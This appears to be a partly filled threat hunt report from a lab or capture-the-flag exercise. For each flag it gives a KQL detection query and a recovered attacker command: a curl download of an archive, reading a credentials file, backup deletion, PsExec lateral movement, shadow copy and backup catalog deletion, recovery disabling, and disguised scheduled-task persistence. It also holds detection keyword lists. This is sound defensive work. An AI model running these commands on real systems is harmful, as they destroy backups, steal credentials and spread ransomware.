
<p align="center">
  <img
    src="https://github.com/user-attachments/assets/337bb215-8833-4653-b570-93c443bd9c11"
    width="1200"
    alt="Threat Hunt Cover Image"
  />
</p>





# 🛡️ Threat Hunt Report – Deep in the Water

---

## 📌 Executive Summary

<Brief, high-level overview of the threat hunt.  
Answer what happened, why it matters, and what was discovered in 3–4 sentences.>

---

## 🎯 Hunt Objectives

- Identify malicious activity across endpoints and network telemetry  
- Correlate attacker behavior to MITRE ATT&CK techniques  
- Document evidence, detection gaps, and response opportunities  

---

## 🧭 Scope & Environment

- **Environment:** <Placeholder>  
- **Data Sources:** <Placeholder>  
- **Timeframe:** <YYYY-MM-DD → YYYY-MM-DD>  
![Uploading image.png…]()

---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
  - [🚩 Flag 1](#-flag-1)
  - [🚩 Flag 2](#-flag-2)
  - [🚩 Flag 3](#-flag-3)
  - [🚩 Flag 4](#-flag-4)
  - [🚩 Flag 5](#-flag-5)
  - [🚩 Flag 6](#-flag-6)
  - [🚩 Flag 7](#-flag-7)
  - [🚩 Flag 8](#-flag-8)
  - [🚩 Flag 9](#-flag-9)
  - [🚩 Flag 10](#-flag-10)
  - [🚩 Flag 11](#-flag-11)
  - [🚩 Flag 12](#-flag-12)
  - [🚩 Flag 13](#-flag-13)
  - [🚩 Flag 14](#-flag-14)
  - [🚩 Flag 15](#-flag-15)
  - [🚩 Flag 16](#-flag-16)
  - [🚩 Flag 17](#-flag-17)
  - [🚩 Flag 18](#-flag-18)
  - [🚩 Flag 19](#-flag-19)
  - [🚩 Flag 21](#-flag-21)
  - [🚩 Flag 22](#-flag-22)
  - [🚩 Flag 23](#-flag-23)
  - [🚩 Flag 24](#-flag-24)
  - [🚩 Flag 25](#-flag-25)
  - [🚩 Flag 26](#-flag-26)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

<High-level narrative describing the attack lifecycle, key behaviors observed, and why this hunt matters.>

---

## 🧬 MITRE ATT&CK Summary

| Flag | Technique Category | MITRE ID | Priority |
|-----:|-------------------|----------|----------|
| 1 | <Placeholder> | <Placeholder> | <Placeholder> |
| 2 | <Placeholder> | <Placeholder> | <Placeholder> |
| 3 | <Placeholder> | <Placeholder> | <Placeholder> |
| 4 | <Placeholder> | <Placeholder> | <Placeholder> |
| 5 | <Placeholder> | <Placeholder> | <Placeholder> |
| 6 | <Placeholder> | <Placeholder> | <Placeholder> |
| 7 | <Placeholder> | <Placeholder> | <Placeholder> |
| 8 | <Placeholder> | <Placeholder> | <Placeholder> |
| 9 | <Placeholder> | <Placeholder> | <Placeholder> |
| 10 | <Placeholder> | <Placeholder> | <Placeholder> |
| 11 | <Placeholder> | <Placeholder> | <Placeholder> |
| 12 | <Placeholder> | <Placeholder> | <Placeholder> |
| 13 | <Placeholder> | <Placeholder> | <Placeholder> |
| 14 | <Placeholder> | <Placeholder> | <Placeholder> |
| 15 | <Placeholder> | <Placeholder> | <Placeholder> |
| 16 | <Placeholder> | <Placeholder> | <Placeholder> |
| 17 | <Placeholder> | <Placeholder> | <Placeholder> |
| 18 | <Placeholder> | <Placeholder> | <Placeholder> |
| 19 | <Placeholder> | <Placeholder> | <Placeholder> |
| 20 | <Placeholder> | <Placeholder> | <Placeholder> |

---

## 🔍 Flag Analysis

_All flags below are collapsible for readability._

---

<details>
<summary id="-flag-1">🚩 <strong>Flag 1: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
DeviceNetworkEvents
| where TimeGenerated >= ago(45d)
| where RemotePort == 22
| where RemoteIP has "10." or RemoteIP has "172." or RemoteIP has "192."
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, RemoteIP
| order by TimeGenerated asc

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T05:39:11.0836084Z|
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceNetworkEvents
| where TimeGenerated >= ago(45d)
| where RemotePort == 22
| where RemoteIP has "10." or RemoteIP has "172." or RemoteIP has "192."
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, RemoteIP
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1527" height="142" alt="image" src="https://github.com/user-attachments/assets/da941ffe-cb3a-45bb-8468-28288009e8e2" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---

<details>
<summary id="-flag-2">🚩 <strong>Flag x: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
10.1.0.108

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T05:39:11.0836084Z|
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceNetworkEvents
| where TimeGenerated == datetime(2025-11-25T05:39:11.0836084Z)
| where DeviceName == "azuki-adminpc"
| where RemotePort == 22
| project LocalIP

### 🖼️ Screenshot
<img width="1562" height="133" alt="image" src="https://github.com/user-attachments/assets/b4a20f90-ae37-41cd-8182-27a5210b6726" />



### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-3">🚩 <strong>Flag x: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T05:39:11.0836084Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceNetworkEvents
| where TimeGenerated == datetime(2025-11-25T05:39:11.0836084Z)
| where DeviceName == "azuki-adminpc"
| where RemotePort == 22
| project TimeGenerated, InitiatingProcessCommandLine

### 🖼️ Screenshot
<img width="1543" height="126" alt="image" src="https://github.com/user-attachments/assets/c728035b-715e-4bc6-992d-60dbf46addf8" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-4">🚩 <strong>Flag x: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
ls --color=auto -la /backups/

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T05:47:51.749736Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-25T05:39:11Z) .. datetime(2025-11-25T06:30:00Z))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has_any ("ls ", "dir ", "find ")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1517" height="107" alt="image" src="https://github.com/user-attachments/assets/2d66000c-c33c-4fdc-8d2a-1e2dd78641be" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-5">🚩 <strong>Flag x: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
find /backups -name *.tar.gz

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-24T14:16:06.546964Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where TimeGenerated between (startofday(datetime(2025-11-24)) .. endofday(datetime(2025-11-26)))
| where DeviceName has "azuki-backupsrv"
| where AccountName has "" "backup-admin"
| project DeviceName, AccountName, TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1525" height="199" alt="image" src="https://github.com/user-attachments/assets/c972a0a2-7c18-4ac0-b01c-cc2dc7c23c6d" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-6">🚩 <strong>Flag 6: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-24T14:16:08.673485Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where ProcessCommandLine has_any ("passwd", "/etc/passwd", "getent", "id", "lslogins")
| project DeviceName, AccountName, TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine

### 🖼️ Screenshot
<img width="772" height="167" alt="image" src="https://github.com/user-attachments/assets/6cfb3235-7ce0-41ed-9303-42e630defe81" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-7">🚩 <strong>Flag 7: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
cat /etc/crontab

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has "/etc/crontab"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="705" height="130" alt="image" src="https://github.com/user-attachments/assets/d8d9a79b-5020-4704-9aab-f9bfe838e8ae" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-8">🚩 <strong>Flag 8: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | <Placeholder> |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has_any ("wget ", "curl ", "scp ", "ftp ")
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="831" height="81" alt="image" src="https://github.com/user-attachments/assets/68d3c840-8130-4b5a-bea2-29ecc9c256a3" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-9">🚩 <strong>Flag x: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
cat /backups/configs/all-credentials.txt

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net> |
| Timestamp | 2025-11-24T14:14:14.217788Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has_any ( "password"  "passwd", "credential", "credentials", "cred", "secret","secrets",  "token", "key", "keys",".key" , ".pem", ".pfx", ".pgpass", ".env",".conf", "/etc/passwd","/etc/shadow", "/etc/bacula",".ssh", "id_rsa", "authorized_keys")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="653" height="100" alt="image" src="https://github.com/user-attachments/assets/03ac9d9a-7655-4355-a32e-96f999e55560" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-10">🚩 <strong>Flag 10: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
rm -rf /backups/archives

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T05:47:02.660493Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z) .. datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any (
    "rm -f",
    "rm -rf",
    "unlink ",
    "xargs rm",
    "find / -exec rm",
    "shred ",
    "dd if=",
    "dd of=",
    "truncate ",
    "/var/backups",
    "/backups",
    "/etc/bacula",
    "/var/lib/bacula",
    ".tar",
    ".tar.gz",
    ".zip",
    ".bak",
    "chmod 000",
    "chattr -i",
    "chattr +i"
)
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessCommandLine, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1527" height="160" alt="image" src="https://github.com/user-attachments/assets/9b45c1bc-d77a-40c2-acdf-770ec63093f6" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-11">🚩 <strong>Flag 11: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
systemctl stop cron

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T05:47:03.659261Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | systemctl stop cron |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z) .. datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any (
    "systemctl stop",  "service ",  "service stop",  "pkill ",  "kill ",  "killall ",    "sv stop",  "rc-service",  "chkconfig", "initctl stop")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc


### 🖼️ Screenshot
<img width="804" height="163" alt="image" src="https://github.com/user-attachments/assets/5178b54c-a5db-451e-babd-c39cc1c249ac" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-12">🚩 <strong>Flag 12: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
systemctl disable cron

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T05:47:03.679621Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z) .. datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any (
    "systemctl stop",
    "systemctl disable",
    "systemctl mask",
    "service stop",
    "initctl stop",
    "rc-service stop",
    "update-rc.d",
    "chkconfig off",
    "pkill ",
    "killall "
)
| project TimeGenerated, AccountName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="575" height="106" alt="image" src="https://github.com/user-attachments/assets/2a925017-a324-4fb9-a8b0-39eedd9f413c" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-13">🚩 <strong>Flag 13: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
PsExec64.exe

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:03:47.900164Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName endswith ".exe"
| where ProcessCommandLine has_any ("\\\\","ADMIN$","IPC$","C$","schtasks","wmic","sc ","psexec","PSEXESVC","at.exe","/node:","process call create")
| summarize DeviceCount=dcount(DeviceName), Devices=make_set(DeviceName) by FileName, ProcessCommandLine
| order by DeviceCount desc

### 🖼️ Screenshot
<img width="792" height="138" alt="image" src="https://github.com/user-attachments/assets/e0f3dd10-f0b8-4fb3-8d64-b92bac00c095" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-14">🚩 <strong>Flag 14: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:03:47.900164Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where FileName =~ "PsExec64.exe"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1107" height="195" alt="image" src="https://github.com/user-attachments/assets/968154fc-27de-49a4-88d8-e2a0c3f69f7a" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-15">🚩 <strong>Flag 15: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
silentlynx.exe

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:03:47.900164Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where FileName =~ "PsExec64.exe"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1107" height="195" alt="image" src="https://github.com/user-attachments/assets/968154fc-27de-49a4-88d8-e2a0c3f69f7a" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-16">🚩 <strong>Flag 16: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
"net" stop VSS /y

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:04:53.2550438Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName in ("net.exe","sc.exe","services.exe")
| where ProcessCommandLine has_any ("VSS","Shadow","Volume")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="927" height="167" alt="image" src="https://github.com/user-attachments/assets/630ac85f-1500-47ec-96e9-2526c9626149" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-17">🚩 <strong>Flag 17: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
"net" stop wbengine /y

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:04:54.0244502Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName in ("net.exe","sc.exe","services.exe")
| where ProcessCommandLine has "wbengine"
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="985" height="166" alt="image" src="https://github.com/user-attachments/assets/2b180578-483e-4749-a57a-eebf14d28580" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-18">🚩 <strong>Flag 18: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
taskkill /F /IM sqlservr.exe

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:07:07.0199729Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T05:55:00Z)..datetime(2025-11-25T06:10:00Z))
| where FileName == "taskkill.exe"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="949" height="133" alt="image" src="https://github.com/user-attachments/assets/70dcd8e3-4568-4660-a558-bd6f9ba3999b" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-19">🚩 <strong>Flag 19: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding

"vssadmin" delete shadows /all /quiet

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:07:08.2198577Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any ("vssadmin","shadowcopy","wmic","net stop","sc stop","diskshadow","wbadmin","bcdedit","reagentc")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="1053" height="167" alt="image" src="https://github.com/user-attachments/assets/1acf40a9-75c8-4097-9c59-c413c140ae90" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-20">🚩 <strong>Flag 20: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
<High-level description of the activity>

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc, azuki-sl |
| Timestamp | 2025-11-25T06:05:00.8701626Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any ("vssadmin","shadowcopy","wmic","net stop","sc stop","diskshadow","wbadmin","bcdedit","reagentc")
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine
| order by TimeGenerated asc


### 🖼️ Screenshot
<img width="676" height="157" alt="image" src="https://github.com/user-attachments/assets/69c9de16-3060-490e-8ba5-00281e2125d5" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-21">🚩 <strong>Flag 21: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
"bcdedit" /set {default} recoveryenabled No

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc, azuki-sl  |
| Timestamp | 2025-11-25T06:04:59.5579336Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName == "bcdedit.exe"
| where ProcessCommandLine has "recoveryenabled"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="541" height="131" alt="image" src="https://github.com/user-attachments/assets/d369ed75-b945-4297-9a09-d56276754ff1" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-22">🚩 <strong>Flag 22: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding

"wbadmin" delete catalog -quiet

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:04:59.7181241Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName == "wbadmin.exe"
| where ProcessCommandLine has "delete catalog"
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="502" height="135" alt="image" src="https://github.com/user-attachments/assets/5f530429-4271-42fa-92bb-ae06f18a772f" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-23">🚩 <strong>Flag 23: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding

WindowsSecurityHealth

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:05:01.1151868Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceRegistryEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where RegistryKey has @"\Run"
| project TimeGenerated, DeviceName, RegistryValueName, RegistryValueData
| order by TimeGenerated asc

### 🖼️ Screenshot
<img width="847" height="133" alt="image" src="https://github.com/user-attachments/assets/788bde3c-f283-4af0-bb55-c9fc7bd6f46e" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-24">🚩 <strong>Flag 24: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
"schtasks" /create /tn "Microsoft\Windows\Security\SecurityHealthService" /tr "C:\Windows\Temp\cache\silentlynx.exe" /sc onlogon /rl highest /f

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | <Placeholder> |
| Timestamp | 2025-11-25T06:05:01.1297501Z |
| Process | <Placeholder> |
| Parent Process | <Placeholder> |
| Command Line | <Placeholder> |

### 💡 Why it matters
<Explain impact, risk, and relevance>

### 🔧 KQL Query Used
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has @"Microsoft\Windows\Security\SecurityHealthService"
| project TimeGenerated, DeviceName, ProcessCommandLine

### 🖼️ Screenshot
<img width="1194" height="99" alt="image" src="https://github.com/user-attachments/assets/5a2691a1-e32b-43eb-80d4-e8ade0e7c95c" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
<Actionable guidance for defenders>

</details>

---
<details>
<summary id="-flag-25">🚩 <strong>Flag 25: <Technique Name></strong></summary>

### 🎯 Objective
<What the attacker was trying to accomplish>

### 📌 Finding
"fsutil.exe" usn deletejournal /D C:

